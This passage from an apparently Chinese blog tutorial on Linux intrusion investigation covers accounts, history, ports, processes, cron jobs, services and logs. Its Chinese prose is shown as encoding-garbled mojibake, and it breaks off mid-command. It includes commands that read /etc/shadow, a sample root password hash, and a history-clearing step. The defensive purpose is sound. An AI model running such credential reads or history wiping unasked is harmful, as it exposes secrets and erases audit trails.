href="#0x01-å…¥ä¾µæ’æŸ¥æ€è·¯" class="headerlink" title="0x01 å…¥ä¾µæ’æŸ¥æ€è·¯"></a>0x01 å…¥ä¾µæ’æŸ¥æ€è·¯</h3><h4 id="1-1-è´¦å·å®‰å…¨"><a href="#1-1-è´¦å·å®‰å…¨" class="headerlink" title="1.1 è´¦å·å®‰å…¨"></a>1.1 è´¦å·å®‰å…¨</h4><p><strong>åŸºæœ¬ä½¿ç”¨ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1ã€ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶&#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">ç”¨æˆ·åï¼šå¯†ç ï¼šç”¨æˆ·IDï¼šç»„IDï¼šç”¨æˆ·è¯´æ˜ï¼šå®¶ç›®å½•ï¼šç™»é™†ä¹‹åshell</span><br><span class="line">æ³¨æ„ï¼šæ— å¯†ç åªå…è®¸æœ¬æœºç™»é™†ï¼Œè¿œç¨‹ä¸å…è®¸ç™»é™†</span><br><span class="line"></span><br><span class="line">2ã€å½±å­æ–‡ä»¶&#x2F;etc&#x2F;shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI&#x2F;:16809:0:99999:7:::</span><br><span class="line">ç”¨æˆ·åï¼šåŠ å¯†å¯†ç ï¼šå¯†ç æœ€åä¸€æ¬¡ä¿®æ”¹æ—¥æœŸï¼šä¸¤æ¬¡å¯†ç çš„ä¿®æ”¹æ—¶é—´é—´éš”ï¼šå¯†ç æœ‰æ•ˆæœŸï¼šå¯†ç ä¿®æ”¹åˆ°æœŸåˆ°çš„è­¦å‘Šå¤©æ•°ï¼šå¯†ç è¿‡æœŸä¹‹åçš„å®½é™å¤©æ•°ï¼šè´¦å·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™</span><br><span class="line">who     æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·ï¼ˆttyæœ¬åœ°ç™»é™†  ptsè¿œç¨‹ç™»å½•ï¼‰</span><br><span class="line">w       æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œæƒ³çŸ¥é“æŸä¸€æ—¶åˆ»ç”¨æˆ·çš„è¡Œä¸º</span><br><span class="line">uptime  æŸ¥çœ‹ç™»é™†å¤šä¹…ã€å¤šå°‘ç”¨æˆ·ï¼Œè´Ÿè½½</span><br></pre></td></tr></table></figure><p><strong>å…¥ä¾µæ’æŸ¥ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1ã€æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line">2ã€æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line">3ã€é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br><span class="line">4ã€ç¦ç”¨æˆ–åˆ é™¤å¤šä½™åŠå¯ç–‘çš„å¸å·</span><br><span class="line">    usermod -L user    ç¦ç”¨å¸å·ï¼Œå¸å·æ— æ³•ç™»å½•ï¼Œ&#x2F;etc&#x2F;shadowç¬¬äºŒæ ä¸º!å¼€å¤´</span><br><span class="line">    userdel user       åˆ é™¤userç”¨æˆ·</span><br><span class="line">    userdel -r user    å°†åˆ é™¤userç”¨æˆ·ï¼Œå¹¶ä¸”å°†&#x2F;homeç›®å½•ä¸‹çš„userç›®å½•ä¸€å¹¶åˆ é™¤</span><br></pre></td></tr></table></figure><h4 id="1-2-å†å²å‘½ä»¤"><a href="#1-2-å†å²å‘½ä»¤" class="headerlink" title="1.2 å†å²å‘½ä»¤"></a>1.2 å†å²å‘½ä»¤</h4><p><strong>åŸºæœ¬ä½¿ç”¨ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡.bash_historyæŸ¥çœ‹å¸å·æ‰§è¡Œè¿‡çš„ç³»ç»Ÿå‘½ä»¤</span><br><span class="line">1ã€rootçš„å†å²å‘½ä»¤</span><br><span class="line">histroy</span><br><span class="line">2ã€æ‰“å¼€&#x2F;homeå„å¸å·ç›®å½•ä¸‹çš„.bash_historyï¼ŒæŸ¥çœ‹æ™®é€šå¸å·çš„å†å²å‘½ä»¤</span><br><span class="line"></span><br><span class="line">ä¸ºå†å²çš„å‘½ä»¤å¢åŠ ç™»å½•çš„IPåœ°å€ã€æ‰§è¡Œå‘½ä»¤æ—¶é—´ç­‰ä¿¡æ¯ï¼š</span><br><span class="line">1ï¼‰ä¿å­˜1ä¸‡æ¡å‘½ä»¤</span><br><span class="line">sed -i &#39;s&#x2F;^HISTSIZE&#x3D;1000&#x2F;HISTSIZE&#x3D;10000&#x2F;g&#39; &#x2F;etc&#x2F;profile</span><br><span class="line">2ï¼‰åœ¨&#x2F;etc&#x2F;profileçš„æ–‡ä»¶å°¾éƒ¨æ·»åŠ å¦‚ä¸‹è¡Œæ•°é…ç½®ä¿¡æ¯ï¼š</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP&#x3D;&#96;who -u am i 2&gt;&#x2F;dev&#x2F;null | awk &#39;&#123;print $NF&#125;&#39; | sed -e &#39;s&#x2F;[()]&#x2F;&#x2F;g&#39;&#96;</span><br><span class="line">if [ &quot;$USER_IP&quot; &#x3D; &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP&#x3D;&#96;hostname&#96;</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT&#x3D;&quot;%F %T $USER_IP &#96;whoami&#96; &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND&#x3D;&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3ï¼‰source &#x2F;etc&#x2F;profileè®©é…ç½®ç”Ÿæ•ˆ</span><br><span class="line"></span><br><span class="line">ç”Ÿæˆæ•ˆæœï¼š 1  2018-07-10 19:45:39 192.168.204.1 root source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">3ã€å†å²æ“ä½œå‘½ä»¤çš„æ¸…é™¤ï¼šhistory -c</span><br><span class="line">ä½†æ­¤å‘½ä»¤å¹¶ä¸ä¼šæ¸…é™¤ä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è®°å½•ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨åˆ é™¤.bash_profileæ–‡ä»¶ä¸­çš„è®°å½•ã€‚</span><br></pre></td></tr></table></figure><p><strong>å…¥ä¾µæ’æŸ¥ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¿›å…¥ç”¨æˆ·ç›®å½•ä¸‹</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><h4 id="1-3-æ£€æŸ¥å¼‚å¸¸ç«¯å£"><a href="#1-3-æ£€æŸ¥å¼‚å¸¸ç«¯å£" class="headerlink" title="1.3 æ£€æŸ¥å¼‚å¸¸ç«¯å£"></a>1.3 æ£€æŸ¥å¼‚å¸¸ç«¯å£</h4><p>ä½¿ç”¨netstat ç½‘ç»œè¿æ¥å‘½ä»¤ï¼Œåˆ†æå¯ç–‘ç«¯å£ã€IPã€PID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹ä¸‹pidæ‰€å¯¹åº”çš„è¿›ç¨‹æ–‡ä»¶è·¯å¾„ï¼Œ</span><br><span class="line">è¿è¡Œls -l &#x2F;proc&#x2F;$PID&#x2F;exeæˆ–file &#x2F;proc&#x2F;$PID&#x2F;exeï¼ˆ$PID ä¸ºå¯¹åº”çš„pid å·ï¼‰</span><br></pre></td></tr></table></figure><h4 id="1-4-æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹"><a href="#1-4-æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹" class="headerlink" title="1.4 æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹"></a>1.4 æ£€æŸ¥å¼‚å¸¸è¿›ç¨‹</h4><p>ä½¿ç”¨pså‘½ä»¤ï¼Œåˆ†æè¿›ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure><h4 id="1-5-æ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹"><a href="#1-5-æ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹" class="headerlink" title="1.5 æ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹"></a>1.5 æ£€æŸ¥å¼€æœºå¯åŠ¨é¡¹</h4><p><strong>åŸºæœ¬ä½¿ç”¨ï¼š</strong></p><p>ç³»ç»Ÿè¿è¡Œçº§åˆ«ç¤ºæ„å›¾ï¼š</p><table><thead><tr><th align="center">è¿è¡Œçº§åˆ«</th><th align="center">å«ä¹‰</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">å…³æœº</td></tr><tr><td align="center">1</td><td align="center">å•ç”¨æˆ·æ¨¡å¼ï¼Œå¯ä»¥æƒ³è±¡ä¸ºwindowsçš„å®‰å…¨æ¨¡å¼ï¼Œä¸»è¦ç”¨äºç³»ç»Ÿä¿®å¤</td></tr><tr><td align="center">2</td><td align="center">ä¸å®Œå…¨çš„å‘½ä»¤è¡Œæ¨¡å¼ï¼Œä¸å«NFSæœåŠ¡</td></tr><tr><td align="center">3</td><td align="center">å®Œå…¨çš„å‘½ä»¤è¡Œæ¨¡å¼ï¼Œå°±æ˜¯æ ‡å‡†å­—ç¬¦ç•Œé¢</td></tr><tr><td align="center">4</td><td align="center">ç³»ç»Ÿä¿ç•™</td></tr><tr><td align="center">5</td><td align="center">å›¾å½¢æ¨¡å¼</td></tr><tr><td align="center">6</td><td align="center">é‡å¯åŠ¨</td></tr></tbody></table><p>æŸ¥çœ‹è¿è¡Œçº§åˆ«å‘½ä»¤ runlevel</p><p>ç³»ç»Ÿé»˜è®¤å…è®¸çº§åˆ«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi  &#x2F;etc&#x2F;inittab</span><br><span class="line">id&#x3D;3ï¼šinitdefault  ç³»ç»Ÿå¼€æœºåç›´æ¥è¿›å…¥å“ªä¸ªè¿è¡Œçº§åˆ«</span><br></pre></td></tr></table></figure><p>å¼€æœºå¯åŠ¨é…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;rc.local</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d</span><br></pre></td></tr></table></figure><p>ä¾‹å­:å½“æˆ‘ä»¬éœ€è¦å¼€æœºå¯åŠ¨è‡ªå·±çš„è„šæœ¬æ—¶ï¼Œåªéœ€è¦å°†å¯æ‰§è¡Œè„šæœ¬ä¸¢åœ¨/etc/init.dç›®å½•ä¸‹ï¼Œç„¶ååœ¨/etc/rc.d/rc*.dä¸­å»ºç«‹è½¯é“¾æ¥å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost ~]# ln -s &#x2F;etc&#x2F;init.d&#x2F;sshd &#x2F;etc&#x2F;rc.d&#x2F;rc3.d&#x2F;S100ssh</span><br></pre></td></tr></table></figure><p>æ­¤å¤„sshdæ˜¯å…·ä½“æœåŠ¡çš„è„šæœ¬æ–‡ä»¶ï¼ŒS100sshæ˜¯å…¶è½¯é“¾æ¥ï¼ŒSå¼€å¤´ä»£è¡¨åŠ è½½æ—¶è‡ªå¯åŠ¨ï¼›å¦‚æœæ˜¯Kå¼€å¤´çš„è„šæœ¬æ–‡ä»¶ï¼Œä»£è¡¨è¿è¡Œçº§åˆ«åŠ è½½æ—¶éœ€è¦å…³é—­çš„ã€‚</p><p><strong>å…¥ä¾µæ’æŸ¥ï¼š</strong></p><p>å¯åŠ¨é¡¹æ–‡ä»¶ï¼š more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/</p><h4 id="1-6-æ£€æŸ¥å®šæ—¶ä»»åŠ¡"><a href="#1-6-æ£€æŸ¥å®šæ—¶ä»»åŠ¡" class="headerlink" title="1.6 æ£€æŸ¥å®šæ—¶ä»»åŠ¡"></a>1.6 æ£€æŸ¥å®šæ—¶ä»»åŠ¡</h4><p><strong>åŸºæœ¬ä½¿ç”¨</strong></p><p>1ã€åˆ©ç”¨crontabåˆ›å»ºè®¡åˆ’ä»»åŠ¡</p><ul><li>åŸºæœ¬å‘½ä»¤</li></ul><p>crontab -l åˆ—å‡ºæŸä¸ªç”¨æˆ·cronæœåŠ¡çš„è¯¦ç»†å†…å®¹</p><p>Tipsï¼šé»˜è®¤ç¼–å†™çš„crontabæ–‡ä»¶ä¼šä¿å­˜åœ¨ (/var/spool/cron/ç”¨æˆ·å ä¾‹å¦‚: /var/spool/cron/root</p><p>crontab -r åˆ é™¤æ¯ä¸ªç”¨æˆ·crontä»»åŠ¡(è°¨æ…ï¼šåˆ é™¤æ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡)</p><p>crontab -e ä½¿ç”¨ç¼–è¾‘å™¨ç¼–è¾‘å½“å‰çš„crontabæ–‡ä»¶</p><p>å¦‚ï¼š*/1* * echo â€œhello worldâ€ &gt;&gt; /tmp/test.txt æ¯åˆ†é’Ÿå†™å…¥æ–‡ä»¶</p><p>2ã€åˆ©ç”¨anacronå®ç°å¼‚æ­¥å®šæ—¶ä»»åŠ¡è°ƒåº¦</p><ul><li>ä½¿ç”¨æ¡ˆä¾‹</li></ul><p>æ¯å¤©è¿è¡Œ /home/backup.shè„šæœ¬ï¼š vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh</p><p>å½“æœºå™¨åœ¨ backup.sh æœŸæœ›è¢«è¿è¡Œæ—¶æ˜¯å…³æœºçš„ï¼Œanacronä¼šåœ¨æœºå™¨å¼€æœºååˆ†é’Ÿä¹‹åè¿è¡Œå®ƒï¼Œè€Œä¸ç”¨å†ç­‰å¾… 7å¤©ã€‚</p><p><strong>å…¥ä¾µæ’æŸ¥</strong></p><p>é‡ç‚¹å…³æ³¨ä»¥ä¸‹ç›®å½•ä¸­æ˜¯å¦å­˜åœ¨æ¶æ„è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;crontab</span><br><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;cron.daily&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;cron.hourly&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;cron.monthly&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;cron.weekly&#x2F;</span><br><span class="line">&#x2F;etc&#x2F;anacrontab</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;anacron&#x2F;*</span><br></pre></td></tr></table></figure><p>å°æŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more &#x2F;etc&#x2F;cron.daily&#x2F;*  æŸ¥çœ‹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</span><br></pre></td></tr></table></figure><h4 id="1-7-æ£€æŸ¥æœåŠ¡"><a href="#1-7-æ£€æŸ¥æœåŠ¡" class="headerlink" title="1.7 æ£€æŸ¥æœåŠ¡"></a>1.7 æ£€æŸ¥æœåŠ¡</h4><p><strong>æœåŠ¡è‡ªå¯åŠ¨</strong></p><p>ç¬¬ä¸€ç§ä¿®æ”¹æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level è¿è¡Œçº§åˆ«] [ç‹¬ç«‹æœåŠ¡å] [on|off]</span><br><span class="line">chkconfig â€“level  2345 httpd on  å¼€å¯è‡ªå¯åŠ¨</span><br><span class="line">chkconfig httpd on ï¼ˆé»˜è®¤levelæ˜¯2345ï¼‰</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§ä¿®æ”¹æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹&#x2F;etc&#x2F;re.d&#x2F;rc.local æ–‡ä»¶  </span><br><span class="line">åŠ å…¥ &#x2F;etc&#x2F;init.d&#x2F;httpd start</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰ç§ä¿®æ”¹æ–¹æ³•ï¼š</p><p>ä½¿ç”¨ntsysvå‘½ä»¤ç®¡ç†è‡ªå¯åŠ¨ï¼Œå¯ä»¥ç®¡ç†ç‹¬ç«‹æœåŠ¡å’ŒxinetdæœåŠ¡ã€‚</p><p><strong>å…¥ä¾µæ’æŸ¥</strong></p><p>1ã€æŸ¥è¯¢å·²å®‰è£…çš„æœåŠ¡ï¼š</p><p>RPMåŒ…å®‰è£…çš„æœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chkconfig  --list  æŸ¥çœ‹æœåŠ¡è‡ªå¯åŠ¨çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„RPMåŒ…å®‰è£…çš„æœåŠ¡</span><br><span class="line">ps aux | grep crond æŸ¥çœ‹å½“å‰æœåŠ¡</span><br><span class="line"></span><br><span class="line">ç³»ç»Ÿåœ¨3ä¸5çº§åˆ«ä¸‹çš„å¯åŠ¨é¡¹ </span><br><span class="line">ä¸­æ–‡ç¯å¢ƒ</span><br><span class="line">chkconfig --list | grep &quot;3:å¯ç”¨\|5:å¯ç”¨&quot;</span><br><span class="line">è‹±æ–‡ç¯å¢ƒ</span><br><span class="line">chkconfig --list | grep &quot;3:on\|5:on&quot;</span><br></pre></td></tr></table></figure><p>æºç åŒ…å®‰è£…çš„æœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹æœåŠ¡å®‰è£…ä½ç½® ï¼Œä¸€èˆ¬æ˜¯åœ¨&#x2F;user&#x2F;local&#x2F;</span><br><span class="line">service httpd start</span><br><span class="line">æœç´¢&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;  æŸ¥çœ‹æ˜¯å¦å­˜åœ¨</span><br></pre></td></tr></table></figure><h4 id="1-8-æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶"><a href="#1-8-æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶" class="headerlink" title="1.8 æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶"></a>1.8 æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶</h4><p>1ã€æŸ¥çœ‹æ•æ„Ÿç›®å½•ï¼Œå¦‚/tmpç›®å½•ä¸‹çš„æ–‡ä»¶ï¼ŒåŒæ—¶æ³¨æ„éšè—æ–‡ä»¶å¤¹ï¼Œä»¥â€œ..â€ä¸ºåçš„æ–‡ä»¶å¤¹å…·æœ‰éšè—å±æ€§</p><p>2ã€å¾—åˆ°å‘ç°WEBSHELLã€è¿œæ§æœ¨é©¬çš„åˆ›å»ºæ—¶é—´ï¼Œå¦‚ä½•æ‰¾å‡ºåŒä¸€æ—¶é—´èŒƒå›´å†…åˆ›å»ºçš„æ–‡ä»¶ï¼Ÿ</p><p> å¯ä»¥ä½¿ç”¨findå‘½ä»¤æ¥æŸ¥æ‰¾ï¼Œå¦‚ find /opt -iname â€œ*â€ -atime 1 -type f æ‰¾å‡º /opt ä¸‹ä¸€å¤©å‰è®¿é—®è¿‡çš„æ–‡ä»¶</p><p>3ã€é’ˆå¯¹å¯ç–‘æ–‡ä»¶å¯ä»¥ä½¿ç”¨statè¿›è¡Œåˆ›å»ºä¿®æ”¹æ—¶é—´ã€‚</p><h4 id="1-9-æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—"><a href="#1-9-æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—" class="headerlink" title="1.9 æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—"></a>1.9 æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—</h4><p>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/</p><p>æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼šmore /etc/rsyslog.conf</p><table><thead><tr><th align="center">æ—¥å¿—æ–‡ä»¶</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">è®°å½•äº†ç³»ç»Ÿå®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—</td></tr><tr><td align="center">/var/log/cups</td><td align="center">è®°å½•æ‰“å°ä¿¡æ¯çš„æ—¥å¿—</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">è®°å½•äº†ç³»ç»Ÿåœ¨å¼€æœºæ—¶å†…æ ¸è‡ªæ£€çš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨dmesgå‘½ä»¤ç›´æ¥æŸ¥çœ‹å†…æ ¸è‡ªæ£€ä¿¡æ¯</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">è®°å½•é‚®ä»¶ä¿¡æ¯</td></tr><tr><td align="center">/var/log/message</td><td align="center">è®°å½•ç³»ç»Ÿé‡è¦ä¿¡æ¯çš„æ—¥å¿—ã€‚è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ä¼šè®°å½•Linuxç³»ç»Ÿçš„ç»å¤§å¤šæ•°é‡è¦ä¿¡æ¯ï¼Œå¦‚æœç³»ç»Ÿå‡ºç°é—®é¢˜æ—¶ï¼Œé¦–å…ˆè¦æ£€æŸ¥çš„å°±åº”è¯¥æ˜¯è¿™ä¸ªæ—¥å¿—æ–‡ä»¶</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">è®°å½•é”™è¯¯ç™»å½•æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viæŸ¥çœ‹ï¼Œè€Œè¦ä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">æ°¸ä¹…è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€ä¿¡æ¯ï¼ŒåŒæ—¶è®°å½•ç³»ç»Ÿçš„å¯åŠ¨ã€é‡å¯ã€å…³æœºäº‹ä»¶ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œéœ€è¦ä½¿ç”¨lastå‘½ä»¤æ¥æŸ¥çœ‹</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šéšç€ç”¨æˆ·çš„ç™»å½•å’Œæ³¨é”€ä¸æ–­å˜åŒ–ï¼Œåªè®°å½•å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨w,who,usersç­‰å‘½ä»¤æ¥æŸ¥è¯¢</td></tr><tr><td align="center">/var/log/secure</td><td align="center">è®°å½•éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œåªè¦æ¶‰åŠè´¦å·å’Œå¯†ç çš„ç¨‹åºéƒ½ä¼šè®°å½•ï¼Œæ¯”å¦‚SSHç™»å½•ï¼Œsuåˆ‡æ¢ç”¨æˆ·ï¼Œsudoæˆæƒï¼Œç”šè‡³æ·»åŠ ç”¨æˆ·å’Œä¿®æ”¹ç”¨æˆ·å¯†ç éƒ½ä¼šè®°å½•åœ¨è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­</td></tr></tbody></table><p>æ—¥å¿—åˆ†ææŠ€å·§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1ã€å®šä½æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºçš„rootå¸å·ï¼š    </span><br><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">å®šä½æœ‰å“ªäº›IPåœ¨çˆ†ç ´ï¼š</span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿ</span><br><span class="line"> grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e 